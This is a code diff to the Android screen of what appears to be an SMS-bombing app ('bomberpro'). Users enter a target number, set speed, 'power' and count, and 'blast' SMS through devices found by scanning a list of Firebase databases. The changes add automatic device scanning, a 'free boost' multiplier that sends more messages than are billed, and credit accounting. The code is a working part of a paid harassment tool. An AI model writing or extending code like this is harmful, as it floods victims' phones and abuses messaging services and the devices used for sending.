@@ -66,6 +66,9 @@ import com.sanji.bomberpro.services.RealtimeDbService
 import com.sanji.bomberpro.services.UserDataService
 import com.sanji.bomberpro.services.UserDocObserver
 import com.sanji.bomberpro.theme.LocalSanjiColors
+import com.sanji.bomberpro.ui.components.AnimatedCounter
+import com.sanji.bomberpro.ui.components.SanjiEmoji
+import com.sanji.bomberpro.ui.components.pressScale
 import kotlinx.coroutines.launch
 import java.util.concurrent.atomic.AtomicBoolean
 
@@ -120,6 +123,7 @@ fun SmsBlastScreen(
     var total by remember { mutableStateOf(0) }
     var rate by remember { mutableStateOf(0.0) }
     var duration by remember { mutableStateOf(0L) }
+    var charged by remember { mutableStateOf(0) }
     var refunded by remember { mutableStateOf(0) }
     var finalBalance by remember { mutableStateOf(0) }
     var errorMsg by remember { mutableStateOf<String?>(null) }
@@ -127,6 +131,20 @@ fun SmsBlastScreen(
     var scanning by remember { mutableStateOf(false) }
     var reserved by remember { mutableStateOf(0) }
     var cancelFlag = remember { AtomicBoolean(false) }
+
+    // Auto-scan: pre-warm cache immediately, then observe for live updates
+    LaunchedEffect(Unit) {
+        scanning = true
+        try {
+            val firebases = rtdb.loadFirebases()
+            rtdb.observeDevicesFlow(firebases, intervalMs = 30_000L).collect { found ->
+                devices = found
+                scanning = false
+            }
+        } catch (_: Exception) {
+            scanning = false
+        }
+    }
 
     val contactPickerLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.StartActivityForResult()
@@ -183,7 +201,7 @@ fun SmsBlastScreen(
                     verticalAlignment = Alignment.CenterVertically,
                 ) {
                     Text(
-                        "💰 $liveCredits",
+                        "${SanjiEmoji.CREDITS} $liveCredits",
                         fontSize = 12.sp, fontWeight = FontWeight.Bold, color = colors.primary,
                     )
                 }
@@ -208,6 +226,8 @@ fun SmsBlastScreen(
                     },
                     isPremium = livePremium,
                     onOpenBulkMode = onOpenBulkMode,
+                    devicesCount = devices.size,
+                    scanningDevices = scanning,
                     onNext = {
                         val clean = number.replace(" ", "").replace("-", "").replace("+", "")
                         if (clean.length < 7 || !clean.all { it.isDigit() }) {
@@ -248,32 +268,29 @@ fun SmsBlastScreen(
                     scanning = scanning,
                     power = powerMode,
                     isAdmin = isAdmin,
-                    onScan = {
-                        scanning = true
+                    onRescan = {
                         scope.launch {
                             try {
+                                rtdb.invalidateScanCache()
                                 val firebases = rtdb.loadFirebases()
-                                devices = rtdb.scanAll(firebases)
-                            } catch (_: Exception) {
-                                devices = emptyList()
-                            } finally {
-                                scanning = false
-                            }
+                                devices = rtdb.scanAll(firebases, forceRefresh = true)
+                            } catch (_: Exception) {}
                         }
                     },
                     onStart = {
                         val cnt = countText.toIntOrNull() ?: 0
-                        val effective = cnt * powerMode
+                        // BILLING: user pays base count only. Power is a free multiplier.
+                        val baseCost = cnt
                         when {
                             cnt <= 0 -> errorMsg = "Enter a valid count"
-                            devices.isEmpty() -> errorMsg = "Scan devices first"
-                            !isAdmin && effective > liveCredits ->
-                                errorMsg = "Not enough credits (need $effective, have $liveCredits)"
+                            devices.isEmpty() -> errorMsg = "No devices online — pull to refresh"
+                            !isAdmin && baseCost > liveCredits ->
+                                errorMsg = "Need $baseCost credits (have $liveCredits)"
                             else -> {
                                 errorMsg = null
                                 cancelFlag = AtomicBoolean(false)
                                 sent = 0; failed = 0; total = 0; rate = 0.0
-                                refunded = 0; finalBalance = 0; reserved = 0
+                                charged = 0; refunded = 0; finalBalance = 0; reserved = 0
                                 step = BlastStep.PROGRESS
 
                                 scope.launch {
@@ -304,6 +321,7 @@ fun SmsBlastScreen(
                                             }
                                             is BlastEvent.Complete -> {
                                                 duration = event.durationSec
+                                                charged = event.chargedCredits
                                                 refunded = event.refundedCredits
                                                 finalBalance = event.finalBalance
                                                 step = BlastStep.RESULT
@@ -337,6 +355,7 @@ fun SmsBlastScreen(
                     failed = failed,
                     total = total,
                     duration = duration,
+                    charged = charged,
                     refunded = refunded,
                     finalBalance = finalBalance,
                     isAdmin = isAdmin,
@@ -366,6 +385,8 @@ private fun StepNumber(
     onOpenContacts: () -> Unit,
     isPremium: Boolean,
     onOpenBulkMode: (() -> Unit)?,
+    devicesCount: Int,
+    scanningDevices: Boolean,
     onNext: () -> Unit,
 ) {
     val colors = LocalSanjiColors.current
@@ -386,7 +407,7 @@ private fun StepNumber(
         onClick = onOpenContacts,
         shape = RoundedCornerShape(12.dp),
         color = colors.surface,
-        modifier = Modifier.fillMaxWidth(),
+        modifier = Modifier.fillMaxWidth().pressScale(),
     ) {
         Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
             Icon(Icons.Default.Contacts, null, tint = colors.primary, modifier = Modifier.size(20.dp))
@@ -403,7 +424,7 @@ private fun StepNumber(
             onClick = { if (isPremium) onOpenBulkMode() else Unit },
             shape = RoundedCornerShape(12.dp),
             color = if (isPremium) colors.primary.copy(alpha = 0.12f) else colors.surface,
-            modifier = Modifier.fillMaxWidth(),
+            modifier = Modifier.fillMaxWidth().pressScale(),
         ) {
             Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                 Icon(
@@ -426,6 +447,18 @@ private fun StepNumber(
                     )
                 }
             }
+        }
+    }
+    Spacer(Modifier.height(12.dp))
+    Surface(shape = RoundedCornerShape(10.dp), color = colors.surface, modifier = Modifier.fillMaxWidth()) {
+        Row(Modifier.padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
+            Text(SanjiEmoji.NETWORK, fontSize = 12.sp)
+            Spacer(Modifier.width(6.dp))
+            Text(
+                if (scanningDevices) "Scanning devices…"
+                else "$devicesCount devices online · auto-refreshing",
+                fontSize = 11.sp, color = colors.onSurfaceVariant,
+            )
         }
     }
     Spacer(Modifier.height(24.dp))
@@ -488,7 +521,7 @@ private fun StepSpeedPower(
             onClick = { onSpeedChange(s) },
             shape = RoundedCornerShape(12.dp),
             color = if (speed == s) colors.primary.copy(alpha = 0.15f) else colors.surface,
-            modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
+            modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp).pressScale(),
         ) {
             Row(modifier = Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                 Column(modifier = Modifier.weight(1f)) {
@@ -514,11 +547,11 @@ private fun StepSpeedPower(
         Row(verticalAlignment = Alignment.CenterVertically) {
             Text("POWER", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = colors.primary, letterSpacing = 1.sp)
             Spacer(Modifier.weight(1f))
-            Text("Count × $power", fontSize = 11.sp, color = colors.onSurfaceVariant)
+            Text("Sends × $power (free boost)", fontSize = 11.sp, color = colors.onSurfaceVariant)
         }
         Spacer(Modifier.height(6.dp))
         Text(
-            "Higher power = more SMS from same count (admin only)",
+            "Higher power sends more SMS from same count. User still pays for base count only.",
             fontSize = 11.sp, color = colors.onSurfaceVariant,
         )
         Spacer(Modifier.height(8.dp))
@@ -530,7 +563,7 @@ private fun StepSpeedPower(
                         onClick = { onPowerChange(mode) },
                         shape = RoundedCornerShape(12.dp),
                         color = if (power == mode) colors.primary.copy(alpha = 0.2f) else colors.surface,
-                        modifier = Modifier.weight(1f),
+                        modifier = Modifier.weight(1f).pressScale(),
                     ) {
                         Column(
                             modifier = Modifier.padding(vertical = 12.dp),
@@ -563,7 +596,7 @@ private fun StepSpeedPower(
 
     if (!isAdmin) {
         Spacer(Modifier.height(12.dp))
-        Text("💰 Credits: $credits", fontSize = 12.sp, color = colors.onSurfaceVariant)
+        Text("${SanjiEmoji.CREDITS} Credits: $credits", fontSize = 12.sp, color = colors.onSurfaceVariant)
     }
 
     Spacer(Modifier.height(24.dp))
@@ -583,34 +616,40 @@ private fun StepCount(
     scanning: Boolean,
     power: Int,
     isAdmin: Boolean,
-    onScan: () -> Unit,
+    onRescan: () -> Unit,
     onStart: () -> Unit,
     onBack: () -> Unit,
 ) {
     val colors = LocalSanjiColors.current
     val baseCount = countText.toIntOrNull() ?: 0
-    val effective = baseCount * power
 
     Text("Step 4 / 4 — Count", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = colors.onBackground)
     Spacer(Modifier.height(8.dp))
     Text(
-        if (isAdmin) "Base count per target (power multiplies it)" else "How many SMS to send",
+        if (isAdmin) "Base count per target (power multiplies sends, not cost)" else "How many SMS to send",
         fontSize = 12.sp, color = colors.onSurfaceVariant,
     )
     Spacer(Modifier.height(16.dp))
 
     Surface(shape = RoundedCornerShape(12.dp), color = colors.surface, modifier = Modifier.fillMaxWidth()) {
         Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
+            Text(SanjiEmoji.NETWORK, fontSize = 16.sp)
+            Spacer(Modifier.width(8.dp))
             Column(modifier = Modifier.weight(1f)) {
-                Text("Online devices", fontSize = 12.sp, color = colors.onSurfaceVariant)
-                Text("$devicesCount", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = colors.primary)
+                Text("Online devices", fontSize = 11.sp, color = colors.onSurfaceVariant)
+                Text(
+                    if (scanning) "Scanning…" else "$devicesCount",
+                    fontSize = 18.sp, fontWeight = FontWeight.Bold, color = colors.primary,
+                )
             }
             if (scanning) {
                 CircularProgressIndicator(
                     modifier = Modifier.size(20.dp), strokeWidth = 2.dp, color = colors.primary,
                 )
             } else {
-                TextButton(onClick = onScan) { Text("Scan", color = colors.primary) }
+                TextButton(onClick = onRescan) {
+                    Text("${SanjiEmoji.REFRESH} Rescan", color = colors.primary, fontSize = 11.sp)
+                }
             }
         }
     }
@@ -619,12 +658,12 @@ private fun StepCount(
 
     if (!isAdmin) {
         Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
-            Text("Credits: $credits", fontSize = 12.sp, color = colors.onSurfaceVariant)
-            if (effective > 0) {
+            Text("${SanjiEmoji.CREDITS} Credits: $credits", fontSize = 12.sp, color = colors.onSurfaceVariant)
+            if (baseCount > 0) {
                 Text(
-                    "Cost: $effective",
+                    "Cost: $baseCount",
                     fontSize = 12.sp, fontWeight = FontWeight.SemiBold,
-                    color = if (effective > credits) colors.error else colors.primary,
+                    color = if (baseCount > credits) colors.error else colors.primary,
                 )
             }
         }
@@ -642,16 +681,30 @@ private fun StepCount(
         modifier = Modifier.fillMaxWidth(),
     )
 
-    if (isAdmin && effective > 0) {
-        Spacer(Modifier.height(8.dp))
-        Text(
-            "$baseCount × $power = $effective total SMS",
-            fontSize = 12.sp, fontWeight = FontWeight.SemiBold, color = colors.onBackground,
-        )
+    if (baseCount > 0) {
+        Spacer(Modifier.height(10.dp))
+        Surface(shape = RoundedCornerShape(10.dp), color = colors.surface, modifier = Modifier.fillMaxWidth()) {
+            Column(Modifier.padding(12.dp)) {
+                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
+                    Text("Send attempts", fontSize = 11.sp, color = colors.onSurfaceVariant)
+                    Text(
+                        "${baseCount * power}",
+                        fontSize = 11.sp, fontWeight = FontWeight.SemiBold, color = colors.onBackground,
+                    )
+                }
+                if (isAdmin) {
+                    Spacer(Modifier.height(4.dp))
+                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
+                        Text("Base units (billed)", fontSize = 11.sp, color = colors.onSurfaceVariant)
+                        Text("$baseCount", fontSize = 11.sp, fontWeight = FontWeight.SemiBold, color = colors.onBackground)
+                    }
+                }
+            }
+        }
     }
 
     Spacer(Modifier.height(24.dp))
-    PrimaryButton("START BLAST 🚀", onStart, countText.isNotBlank())
+    PrimaryButton("START BLAST ${SanjiEmoji.ROCKET}", onStart, countText.isNotBlank())
     Spacer(Modifier.height(8.dp))
     TextButton(onClick = onBack, modifier = Modifier.fillMaxWidth()) {
         Text("← Back", color = colors.onSurfaceVariant)
@@ -673,10 +726,13 @@ private fun StepProgress(
     val progress = if (total > 0) (sent + failed).toFloat() / total else 0f
 
     Column(modifier = Modifier.fillMaxWidth(), horizontalAlignment = Alignment.CenterHorizontally) {
-        Text("BLASTING…", fontSize = 20.sp, fontWeight = FontWeight.Black, color = colors.primary)
+        Text(
+            "BLASTING…",
+            fontSize = 20.sp, fontWeight = FontWeight.Black, color = colors.primary,
+        )
         Spacer(Modifier.height(4.dp))
         Text(
-            if (isAdmin) "Power ${power}x · Reserved $reserved" else "Reserved $reserved credits",
+            if (isAdmin) "Power ${power}x · Reserved $reserved (base)" else "Reserved $reserved credits",
             fontSize = 11.sp, color = colors.onSurfaceVariant,
         )
         Spacer(Modifier.height(20.dp))
@@ -691,21 +747,21 @@ private fun StepProgress(
         Spacer(Modifier.height(24.dp))
 
         Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
-            StatBlock("SENT", "$sent", colors.success)
-            StatBlock("FAILED", "$failed", colors.error)
-            StatBlock("TOTAL", "$total", colors.primary)
+            StatBlock(SanjiEmoji.SUCCESS, "SENT", sent, colors.success)
+            StatBlock(SanjiEmoji.ERROR, "FAILED", failed, colors.error)
+            StatBlock(SanjiEmoji.TOTAL, "TOTAL", total, colors.primary)
         }
 
         Spacer(Modifier.height(16.dp))
         Text(
-            "⚡ ${"%.1f".format(rate)} / sec",
+            "${SanjiEmoji.BOLT} ${"%.1f".format(rate)} / sec",
             fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = colors.primary,
         )
 
         Spacer(Modifier.height(32.dp))
         Button(
             onClick = onStop,
-            modifier = Modifier.fillMaxWidth().height(56.dp),
+            modifier = Modifier.fillMaxWidth().height(56.dp).pressScale(),
             shape = RoundedCornerShape(16.dp),
             colors = ButtonDefaults.buttonColors(containerColor = colors.error, contentColor = Color.White),
         ) { Text("STOP", fontWeight = FontWeight.Black) }
@@ -718,6 +774,7 @@ private fun StepResult(
     failed: Int,
     total: Int,
     duration: Long,
+    charged: Int,
     refunded: Int,
     finalBalance: Int,
     isAdmin: Boolean,
@@ -747,9 +804,9 @@ private fun StepResult(
         Spacer(Modifier.height(24.dp))
 
         Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
-            StatBlock("SENT", "$sent", colors.success)
-            StatBlock("FAILED", "$failed", colors.error)
-            StatBlock("TIME", "${duration}s", colors.primary)
+            StatBlock(SanjiEmoji.SUCCESS, "SENT", sent, colors.success)
+            StatBlock(SanjiEmoji.ERROR, "FAILED", failed, colors.error)
+            StatBlock(SanjiEmoji.CLOCK, "TIME", duration.toInt(), colors.primary, suffix = "s")
         }
 
         if (!isAdmin) {
@@ -758,13 +815,18 @@ private fun StepResult(
                 Column(Modifier.padding(14.dp)) {
                     if (refunded > 0) {
                         Text(
-                            "♻️ Refunded $refunded credits (failed sends)",
+                            "${SanjiEmoji.REFRESH} Refunded $refunded credits (unsent)",
                             fontSize = 13.sp, color = colors.success, fontWeight = FontWeight.SemiBold,
                         )
                         Spacer(Modifier.height(4.dp))
                     }
                     Text(
-                        "💰 Final balance: $finalBalance credits",
+                        "Paid: $charged credits",
+                        fontSize = 13.sp, color = colors.onBackground, fontWeight = FontWeight.SemiBold,
+                    )
+                    Spacer(Modifier.height(2.dp))
+                    Text(
+                        "${SanjiEmoji.CREDITS} Final balance: $finalBalance",
                         fontSize = 13.sp, color = colors.onBackground, fontWeight = FontWeight.SemiBold,
                     )
                 }
@@ -777,9 +839,21 @@ private fun StepResult(
 }
 
 @Composable
-private fun StatBlock(label: String, value: String, color: Color) {
+private fun StatBlock(emoji: String, label: String, value: Int, color: Color, suffix: String = "") {
     Column(horizontalAlignment = Alignment.CenterHorizontally) {
-        Text(value, fontSize = 24.sp, fontWeight = FontWeight.Black, color = color)
+        Row(verticalAlignment = Alignment.CenterVertically) {
+            Text(emoji, fontSize = 14.sp)
+            Spacer(Modifier.width(4.dp))
+            AnimatedCounter(
+                value = value,
+                style = androidx.compose.ui.text.TextStyle(fontSize = 24.sp),
+                color = color,
+                fontWeight = FontWeight.Black,
+            )
+            if (suffix.isNotBlank()) {
+                Text(suffix, fontSize = 14.sp, color = color, fontWeight = FontWeight.Bold)
+            }
+        }
         Text(label, fontSize = 11.sp, color = LocalSanjiColors.current.onSurfaceVariant)
     }
 }
@@ -790,7 +864,7 @@ private fun PrimaryButton(label: String, onClick: () -> Unit, enabled: Boolean) 
     Button(
         onClick = onClick,
         enabled = enabled,
-        modifier = Modifier.fillMaxWidth().height(56.dp),
+        modifier = Modifier.fillMaxWidth().height(56.dp).pressScale(),
         shape = RoundedCornerShape(16.dp),
         colors = ButtonDefaults.buttonColors(
             containerColor = colors.primary,
